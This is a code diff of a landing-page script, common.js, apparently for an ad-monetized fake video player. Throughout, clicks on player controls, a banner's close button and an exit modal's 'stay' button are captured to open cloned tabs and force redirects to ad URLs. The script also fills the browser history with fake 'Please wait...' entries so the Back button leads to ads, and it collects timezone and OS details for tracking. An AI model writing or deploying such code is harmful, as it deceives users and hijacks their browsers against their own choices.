@@ -1,21 +1,13 @@
+/* common.js — player clone flow / chromium-safe micro handoff */
+
 (() => {
   "use strict";
 
-  const safe = (fn, fallback = undefined) => {
-    try {
-      const v = fn();
-      return v === undefined ? fallback : v;
-    } catch {
-      return fallback;
-    }
-  };
+  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
+  const err = (...a) => safe(() => console.error(...a));
 
   const replaceTo = (url) => {
-    try {
-      window.location.replace(url);
-    } catch {
-      window.location.href = url;
-    }
+    try { window.location.replace(url); } catch { window.location.href = url; }
   };
 
   const openTab = (url) => {
@@ -31,25 +23,10 @@
   };
 
   const curUrl = new URL(window.location.href);
-  const getSP = (key, def = "") => curUrl.searchParams.get(key) ?? def;
+  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
 
   const CLONE_PARAM = "__cl";
-  const FAST_PARAM = "__fast";
-  const MICRO_DONE_KEY = "__micro_done";
-  const REVERSE_STATE_KEY = "__rev_player";
-
   const isClone = getSP(CLONE_PARAM) === "1";
-
-  if (isClone) {
-    document.documentElement.classList.add("clone-mode");
-    if (document.readyState === "loading") {
-      document.addEventListener("DOMContentLoaded", () => {
-        document.body.classList.add("clone-mode");
-      }, { once: true });
-    } else if (document.body) {
-      document.body.classList.add("clone-mode");
-    }
-  }
 
   const IN = {
     pz: getSP("pz"),
@@ -74,28 +51,7 @@
     external_id: getSP("external_id"),
     creative_id: getSP("creative_id"),
     ad_campaign_id: getSP("ad_campaign_id"),
-    cost: getSP("cost")
-  };
-
-  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, "") || "";
-  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset(), 0);
-
-  let osVersionCached = "";
-  safe(async () => {
-    const nav = navigator;
-    if (!nav.userAgentData?.getHighEntropyValues) return;
-    const values = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
-    osVersionCached = values?.platformVersion || "";
-  });
-
-  const buildCmeta = () => {
-    const html = document.documentElement;
-    const payload = {
-      dataVer: html.getAttribute("data-version") || html.dataset.version || "",
-      landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
-      templateHash: window.templateHash || ""
-    };
-    return safe(() => btoa(JSON.stringify(payload)), "");
+    cost: getSP("cost"),
   };
 
   const qsFromObj = (obj) => {
@@ -106,45 +62,79 @@
     return qs;
   };
 
+  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
+  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;
+
+  const getOsVersion = async () => {
+    try {
+      const nav = navigator;
+      if (!nav.userAgentData?.getHighEntropyValues) return "";
+      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
+      return v?.platformVersion || "";
+    } catch {
+      return "";
+    }
+  };
+
+  let osVersionCached = "";
+  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));
+
+  const buildCmeta = () => {
+    try {
+      const html = document.documentElement;
+      const payload = {
+        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
+        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
+        templateHash: window.templateHash || "",
+      };
+      return btoa(JSON.stringify(payload));
+    } catch {
+      return "";
+    }
+  };
+
   const normalizeConfig = (appCfg) => {
     if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
 
     const cfg = { domain: appCfg.domain };
     const ensure = (name) => (cfg[name] ||= {});
 
-    Object.entries(appCfg).forEach(([key, value]) => {
-      if (value == null || value === "" || key === "domain") return;
+    Object.entries(appCfg).forEach(([k, v]) => {
+      if (v == null || v === "" || k === "domain") return;
 
-      let m = key.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
+      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
       if (m) {
         const [, name, tab, field] = m;
         const ex = ensure(name);
         (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
-        ex[tab][field] = value;
+        ex[tab][field] = v;
         return;
       }
 
-      m = key.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
+      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
       if (m) {
-        ensure(m[1])[m[2]] = value;
+        ensure(m[1])[m[2]] = v;
         return;
       }
 
-      m = key.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
+      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
       if (m) {
         const [, name, field] = m;
         const ex = ensure(name);
-        const tab = name === "tabUnderClick" ? "newTab" : "currentTab";
+        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
         (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
-        ex[tab][field] = value;
+        ex[tab][field] = v;
       }
     });
 
     return cfg;
   };
 
-  const buildExitQS = ({ zoneId }) => {
-    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
+  const buildExitQSFast = ({ zoneId }) => {
+    const ab2r =
+      IN.abtest ||
+      (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
+
     const base = {
       ymid: IN.var_1 || IN.var || "",
       var: IN.var_2 || IN.z || "",
@@ -165,19 +155,19 @@
       external_id: IN.external_id || "",
       creative_id: IN.creative_id || "",
       ad_campaign_id: IN.ad_campaign_id || "",
-      cost: IN.cost || ""
+      cost: IN.cost || "",
     };
 
     if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
     return qsFromObj(base);
   };
 
-  const generateAfuUrl = (zoneId, domain) => {
+  const generateAfuUrlFast = (zoneId, domain) => {
     const host = String(domain || "").trim();
     if (!host) return "";
     const base = host.startsWith("http") ? host : `https://${host}`;
     const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
-    url.search = buildExitQS({ zoneId }).toString();
+    url.search = buildExitQSFast({ zoneId }).toString();
     return url.toString();
   };
 
@@ -208,179 +198,109 @@
     }
   };
 
-  const resolveExitUrl = (ex, cfg) => {
-    if (!ex) return "";
-    if (ex.url) return buildDirectUrlWithTracking(ex.url);
-    if (ex.zoneId && (ex.domain || cfg?.domain)) {
-      return generateAfuUrl(ex.zoneId, ex.domain || cfg.domain);
-    }
-    return "";
-  };
-
   const pushBackStates = (url, count) => {
-    const n = Math.max(0, parseInt(count, 10) || 0);
-    const originalUrl = window.location.href;
-
-    for (let i = 0; i < n; i += 1) {
-      window.history.pushState(null, "Please wait...", url);
+    try {
+      const n = Math.max(0, parseInt(count, 10) || 0);
+      const originalUrl = window.location.href;
+      for (let i = 0; i < n; i++) {
+        window.history.pushState(null, "Please wait...", url);
+      }
+      window.history.pushState(null, document.title, originalUrl);
+    } catch (e) {
+      err("Back pushState error:", e);
     }
-    window.history.pushState(null, document.title, originalUrl);
   };
 
   const getDefaultBackHtmlUrl = () => {
     const { origin, pathname } = window.location;
     let dir = pathname.replace(/\/(index|back)\.html$/i, "");
     if (dir.endsWith("/")) dir = dir.slice(0, -1);
-    return dir ? `${origin}${dir}/back.html` : `${origin}/back.html`;
+    if (!dir) return `${origin}/back.html`;
+    return `${origin}${dir}/back.html`;
   };
 
-  const initBack = (cfg) => {
-    const back = cfg?.back?.currentTab;
-    if (!back) return;
+  const initBackFast = (cfg) => {
+    const b = cfg?.back?.currentTab;
+    if (!b) return;
 
     const count = cfg.back?.count ?? 10;
     const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
     const page = new URL(pageUrl, window.location.href);
-    const qs = buildExitQS({ zoneId: back.zoneId });
+    const qs = buildExitQSFast({ zoneId: b.zoneId });
 
-    if (back.url) {
-      qs.set("url", String(back.url));
+    if (b.url) {
+      qs.set("url", String(b.url));
     } else {
-      qs.set("z", String(back.zoneId));
-      qs.set("domain", String(back.domain || cfg.domain || ""));
+      qs.set("z", String(b.zoneId));
+      qs.set("domain", String(b.domain || cfg.domain || ""));
     }
 
     page.search = qs.toString();
     pushBackStates(page.toString(), count);
   };
 
-  const logExitMetric = (eventName, ex) => {
-    safe(() => window.syncMetric?.({
-      event: eventName,
-      exitZoneId: ex?.zoneId || ex?.url
-    }));
+  const resolveUrlFast = (ex, cfg) => {
+    if (!ex) return "";
+    if (ex.url) return buildDirectUrlWithTracking(ex.url);
+    if (ex.zoneId && (ex.domain || cfg?.domain)) {
+      return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
+    }
+    return "";
   };
 
-  const runExitCurrentTab = (cfg, name, withBack = true) => {
+  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name]?.currentTab;
-    if (!ex) return false;
+    if (!ex) return;
 
-    const url = resolveExitUrl(ex, cfg);
-    if (!url) return false;
+    const url = resolveUrlFast(ex, cfg);
+    if (!url) return;
 
-    logExitMetric(name, ex);
+    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
 
-    if (withBack) initBack(cfg);
-    setTimeout(() => replaceTo(url), withBack ? 40 : 0);
-    return true;
+    if (withBack) {
+      initBackFast(cfg);
+      setTimeout(() => replaceTo(url), 40);
+    } else {
+      replaceTo(url);
+    }
   };
 
-  const runExitDualTabs = (cfg, name, withBack = true) => {
+  const runExitDualTabsFast = (cfg, name, withBack = true) => {
     const ex = cfg?.[name];
-    if (!ex) return false;
+    if (!ex) return;
 
-    const currentTab = ex.currentTab;
-    const newTab = ex.newTab;
+    const ct = ex.currentTab;
+    const nt = ex.newTab;
+    const ctUrl = resolveUrlFast(ct, cfg);
+    const ntUrl = resolveUrlFast(nt, cfg);
 
-    const currentTabUrl = resolveExitUrl(currentTab, cfg);
-    const newTabUrl = resolveExitUrl(newTab, cfg);
+    safe(() => {
+      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
+      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
+    });
 
-    if (!currentTabUrl && !newTabUrl) return false;
-
-    if (currentTabUrl) logExitMetric(name, currentTab);
-    if (newTabUrl) logExitMetric(name, newTab);
-
-    if (withBack) initBack(cfg);
-    if (newTabUrl) openTab(newTabUrl);
-    if (currentTabUrl) setTimeout(() => replaceTo(currentTabUrl), withBack ? 40 : 0);
-
-    return true;
+    if (withBack) initBackFast(cfg);
+    if (ntUrl) openTab(ntUrl);
+    if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
   };
 
   const run = (cfg, name) => {
-    if (cfg?.[name]?.newTab) return runExitDualTabs(cfg, name, true);
-    return runExitCurrentTab(cfg, name, true);
-  };
-
-  const isPlayerReady = () => {
-    const btn = document.querySelector(".xh-main-play-trigger");
-    return !!(btn && btn.classList.contains("ready"));
-  };
-
-  const buildCloneUrl = (fast) => {
-    const u = new URL(window.location.href);
-    u.searchParams.set(CLONE_PARAM, "1");
-
-    if (fast) u.searchParams.set(FAST_PARAM, "1");
-    else u.searchParams.delete(FAST_PARAM);
-
-    const video = document.querySelector("video");
-    const imgFrame = document.querySelector(".xh-frame");
-
-    if (video) {
-      u.searchParams.set("t", String(video.currentTime || 0));
-      const poster = video.getAttribute("poster");
-      if (poster) u.searchParams.set("__poster", poster);
-    } else if (imgFrame?.src) {
-      u.searchParams.set("t", "0");
-      u.searchParams.set("__poster", imgFrame.src);
+    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
+      return cfg?.mainExit?.newTab
+        ? runExitDualTabsFast(cfg, "mainExit", true)
+        : runExitCurrentTabFast(cfg, "mainExit", true);
     }
-
-    return u.toString();
+    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
+    return runExitCurrentTabFast(cfg, name, true);
   };
-
-  const runMicroHandoff = (cfg, fast) => {
-  if (isClone) return;
-
-  if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
-    return run(cfg, "mainExit");
-  }
-
-  safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
-
-  const cloneUrl = buildCloneUrl(!!fast);
-
-  safe(() => window.syncMetric?.({
-    event: fast ? "micro_open_clone_fast" : "micro_open_clone_slow"
-  }));
-
-  const cloneWin = openTab(cloneUrl);
-
-  const ex = cfg?.autoexit?.currentTab || cfg?.autoexit?.newTab;
-  const monetUrl = resolveUrlFast(ex, cfg);
-
-  if (!monetUrl) {
-    run(cfg, "mainExit");
-    return;
-  }
-
-  safe(() => window.syncMetric?.({
-    event: "tabUnderClick",
-    exitZoneId: ex?.zoneId || ex?.url
-  }));
-
-  initBackFast(cfg);
-
-  const isTelegram = /Telegram/i.test(navigator.userAgent || "");
-
-  // Если клон не открылся, в Telegram не уводим сразу в жёсткий micro-redirect
-  if (isTelegram && !cloneWin) {
-    run(cfg, "mainExit");
-    return;
-  }
-
-  setTimeout(() => {
-    replaceTo(monetUrl);
-  }, isTelegram ? 120 : 40);
-};
 
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
 
-    safe(() => window.history.pushState({ [REVERSE_STATE_KEY]: 1 }, "", window.location.href));
+    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
     window.addEventListener("popstate", (e) => {
-      if (e?.state && e.state[REVERSE_STATE_KEY] === 1) {
-        runExitCurrentTab(cfg, "reverse", false);
+      if (e?.state && e.state.__rev === 1) {
+        runExitCurrentTabFast(cfg, "reverse", false);
       }
     });
   };
@@ -393,7 +313,7 @@
 
     const trigger = () => {
       if (document.visibilityState === "visible" && armed) {
-        runExitCurrentTab(cfg, "autoexit", true);
+        runExitCurrentTabFast(cfg, "autoexit", true);
       }
     };
 
@@ -413,8 +333,76 @@
     });
   };
 
+  const isPlayerReady = () => {
+    const btn = document.querySelector(".xh-main-play-trigger");
+    return !!(btn && btn.classList.contains("ready"));
+  };
+
+  const MICRO_DONE_KEY = "__micro_done";
+
+  const buildCloneUrl = (fast) => {
+    const u = new URL(window.location.href);
+    u.searchParams.set(CLONE_PARAM, "1");
+
+    if (fast) u.searchParams.set("__fast", "1");
+    else u.searchParams.delete("__fast");
+
+    if (fast) u.searchParams.set("__skipPreview", "1");
+    else u.searchParams.delete("__skipPreview");
+
+    const video = document.querySelector("video");
+    const imgFrame = document.querySelector(".xh-frame");
+
+    if (video) {
+      u.searchParams.set("t", video.currentTime || 0);
+      const poster = video.getAttribute("poster");
+      if (poster) u.searchParams.set("__poster", poster);
+    } else if (imgFrame) {
+      u.searchParams.set("t", 0);
+      if (imgFrame.src) u.searchParams.set("__poster", imgFrame.src);
+    }
+
+    return u.toString();
+  };
+
+  const runMicroHandoff = (cfg, fast) => {
+    if (isClone) return;
+
+    if (safe(() => sessionStorage.getItem(MICRO_DONE_KEY)) === "1") {
+      return run(cfg, "mainExit");
+    }
+
+    safe(() => sessionStorage.setItem(MICRO_DONE_KEY, "1"));
+
+    const cloneUrl = buildCloneUrl(!!fast);
+
+    safe(() => window.syncMetric?.({
+      event: fast ? "micro_open_clone_fast" : "micro_open_clone_slow"
+    }));
+
+    openTab(cloneUrl);
+
+    const ex = cfg?.autoexit?.currentTab || cfg?.autoexit?.newTab;
+    const monetUrl = resolveUrlFast(ex, cfg);
+
+    if (monetUrl) {
+      safe(() => window.syncMetric?.({
+        event: "tabUnderClick",
+        exitZoneId: ex?.zoneId || ex?.url
+      }));
+
+      initBackFast(cfg);
+
+      // ВАЖНО: без setTimeout, чтобы вернуть старое chromium-поведение
+      replaceTo(monetUrl);
+      return;
+    }
+
+    run(cfg, "mainExit");
+  };
+
   const initClickMap = (cfg) => {
-    const fired = { mainExit: false };
+    const fired = { mainExit: false, back: false };
     const microTargets = new Set([
       "timeline",
       "play_pause",
@@ -425,12 +413,19 @@
       "pip_bottom"
     ]);
 
+    const consumeFastFlag = (fallback) => {
+      const v = (window.__FAST_CLICK__ === true);
+      window.__FAST_CLICK__ = false;
+      return v || !!fallback;
+    };
+
     document.addEventListener("click", (e) => {
       const zone = e.target?.closest?.("[data-target]");
-      const target = zone?.getAttribute("data-target") || "";
+      const t = zone?.getAttribute("data-target") || "";
       const modal = document.getElementById("xh_exit_modal");
+      const banner = document.getElementById("xh_banner");
 
-      if (target === "main_play") {
+      if (t === "main_play") {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
@@ -446,7 +441,7 @@
         return;
       }
 
-      if (target === "banner_main") {
+      if (t === "banner_main") {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
@@ -454,42 +449,47 @@
         return;
       }
 
-      if (target === "back_button") {
+      if (t === "banner_close") {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
+        if (banner) banner.style.display = "none";
+        runMicroHandoff(cfg, true);
+        return;
+      }
 
+      if (t === "back_button") {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
         if (modal) {
           modal.style.display = "flex";
           modal.setAttribute("aria-hidden", "false");
+          fired.back = true;
         }
         return;
       }
 
-      if (target === "modal_stay") {
+      if (t === "modal_stay") {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
-
         if (modal) {
           modal.style.display = "none";
           modal.setAttribute("aria-hidden", "true");
         }
-
         runMicroHandoff(cfg, false);
         return;
       }
 
-      if (target === "modal_leave") {
+      if (t === "modal_leave") {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
-
         if (modal) {
           modal.style.display = "none";
           modal.setAttribute("aria-hidden", "true");
         }
-
         run(cfg, "ageExit");
         return;
       }
@@ -497,31 +497,27 @@
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
-
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
-
         run(cfg, "mainExit");
         return;
       }
 
-      if (microTargets.has(target)) {
+      if (microTargets.has(t)) {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
-
-        runMicroHandoff(cfg, true);
+        const fast = consumeFastFlag(true);
+        runMicroHandoff(cfg, fast);
         return;
       }
 
       if (fired.mainExit) return;
       fired.mainExit = true;
-
       e.preventDefault();
       e.stopPropagation();
       e.stopImmediatePropagation();
-
       run(cfg, "mainExit");
     }, true);
   };
@@ -538,9 +534,9 @@
     window.LANDING_EXITS = {
       cfg,
       run: (name) => run(cfg, name),
-      initBack: () => initBack(cfg),
+      initBack: () => initBackFast(cfg),
       microHandoff: (fast) => runMicroHandoff(cfg, fast),
-      isPlayerReady
+      isPlayerReady,
     };
 
     initClickMap(cfg);
@@ -549,7 +545,7 @@
   };
 
   if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", boot, { once: true });
+    document.addEventListener("DOMContentLoaded", boot);
   } else {
     boot();
   }
